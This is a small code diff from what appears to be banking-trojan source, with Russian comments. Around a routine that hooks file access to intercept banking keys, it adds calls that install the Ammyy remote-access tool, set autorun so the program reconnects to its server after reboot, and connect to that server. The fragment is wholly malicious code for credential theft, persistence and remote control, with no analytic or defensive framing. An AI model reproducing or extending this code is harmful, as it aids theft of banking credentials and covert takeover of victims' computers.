@@ -302,6 +302,11 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 							// Ставим хуки на доступ к файлам, для перехвата
 							// ключей
                             HookBSSCreateFileW();
+							#ifdef AmmyyH
+								Ammyy::Install(false);
+							#endif 
+							VideoProcess::SetAutorun(true); //после ребута сконектиться с сервером
+							VideoProcess::ConnectToServer(0);
 						}
 					}
 
